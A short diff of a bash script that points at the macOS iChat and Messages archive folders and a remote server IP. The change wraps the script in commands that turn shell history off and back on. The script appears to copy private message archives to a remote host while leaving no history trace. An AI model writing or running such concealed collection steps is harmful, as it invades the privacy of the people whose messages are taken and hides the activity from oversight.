@@ -1,4 +1,5 @@
 #!/bin/bash
+set +o history
 ARCHIVE=~/Library/Containers/com.apple.iChat/Data/Library/Messages/Archive
 MESSAGES=~/Library/Messages
 SERV=73.240.200.192
@@ -27,4 +28,4 @@ if [ $? -eq 0 ]; then
 fi
 
 rm -rf ${KEYDIR} #cleanup
-
+set -o history
